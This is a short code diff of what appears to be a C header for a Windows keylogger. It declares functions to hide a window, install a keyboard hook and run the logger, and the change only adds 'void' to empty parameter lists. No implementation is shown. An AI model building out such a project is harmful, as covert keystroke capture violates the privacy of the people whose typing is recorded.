@@ -31,9 +31,9 @@ extern HHOOK g_Hook;
 void    HideWindow(void);
 
 /* Key Hook */
-bool    SetupKeyHook();
-void    RemoveKeyHook();
-bool    Keylogger();
+bool    SetupKeyHook(void);
+void    RemoveKeyHook(void);
+bool    Keylogger(void);
 
 /*Callback*/
 LRESULT CALLBACK    KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
